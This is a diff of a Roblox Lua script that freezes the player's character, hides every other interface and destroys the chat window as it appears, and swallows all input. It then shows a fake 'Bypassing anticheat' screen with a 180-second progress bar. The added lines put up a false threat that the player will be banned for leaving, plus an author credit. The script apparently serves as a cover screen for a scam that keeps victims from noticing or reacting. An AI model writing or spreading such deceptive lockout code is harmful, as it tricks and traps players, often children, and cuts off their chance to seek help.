@@ -9,45 +9,45 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local function disableMovement()
-	local character = player.Character or player.CharacterAdded:Wait()
-	local humanoid = character:FindFirstChildOfClass("Humanoid")
-	if humanoid then
-		humanoid.WalkSpeed = 0
-		humanoid.JumpPower = 0
-	end
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+    end
 end
 
 disableMovement()
 player.CharacterAdded:Connect(disableMovement)
 
 for _, gui in pairs(playerGui:GetChildren()) do
-	if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
-		gui.Enabled = false
-	end
+    if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
+        gui.Enabled = false
+    end
 end
 
 playerGui.ChildAdded:Connect(function(child)
-	if child:IsA("ScreenGui") and child.Name ~= "FullCoverLoading" then
-		child.Enabled = false
-	end
+    if child:IsA("ScreenGui") and child.Name ~= "FullCoverLoading" then
+        child.Enabled = false
+    end
 end)
 
 pcall(function()
-	if TextChatService:FindFirstChild("ChatWindowConfiguration") then
-		TextChatService.ChatWindowConfiguration.Enabled = false
-	end
+    if TextChatService:FindFirstChild("ChatWindowConfiguration") then
+        TextChatService.ChatWindowConfiguration.Enabled = false
+    end
 end)
 
 pcall(function()
-	if CoreGui:FindFirstChild("Chat") then
-		CoreGui.Chat:Destroy()
-	end
+    if CoreGui:FindFirstChild("Chat") then
+        CoreGui.Chat:Destroy()
+    end
 end)
 
 CoreGui.ChildAdded:Connect(function(child)
-	if child.Name == "Chat" then
-		child:Destroy()
-	end
+    if child.Name == "Chat" then
+        child:Destroy()
+    end
 end)
 
 local screenGui = Instance.new("ScreenGui")
@@ -85,15 +85,37 @@ bypassText.Text = "Bypassing anticheat... please wait"
 bypassText.ZIndex = 10001
 bypassText.Parent = background
 
+local warningText = Instance.new("TextLabel")
+warningText.Size = UDim2.new(1, 0, 0.05, 0)
+warningText.Position = UDim2.new(0, 0, 0.55, 0)
+warningText.BackgroundTransparency = 1
+warningText.TextColor3 = Color3.new(0.8, 0.2, 0.2)
+warningText.Font = Enum.Font.SourceSans
+warningText.TextScaled = true
+warningText.Text = "Wait for the loading screen to load. Don't leave, or you'll get banned."
+warningText.ZIndex = 10001
+warningText.Parent = background
+
+local creditText = Instance.new("TextLabel")
+creditText.Size = UDim2.new(1, 0, 0.04, 0)
+creditText.Position = UDim2.new(0, 0, 0.6, 0)
+creditText.BackgroundTransparency = 1
+creditText.TextColor3 = Color3.new(0.6, 0.6, 0.6)
+creditText.Font = Enum.Font.SourceSans
+creditText.TextScaled = true
+creditText.Text = "by @zenxq"
+creditText.ZIndex = 10001
+creditText.Parent = background
+
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
-	return Enum.ContextActionResult.Sink
+    return Enum.ContextActionResult.Sink
 end)
 
 local totalTime = 180
 local steps = 100
 for i = 1, steps do
-	task.wait(totalTime / steps)
-	loadingText.Text = "Loading.. " .. i .. "%"
+    task.wait(totalTime / steps)
+    loadingText.Text = "Loading.. " .. i .. "%"
 end
 
 loadingText.Text = "Loading.. 100%"
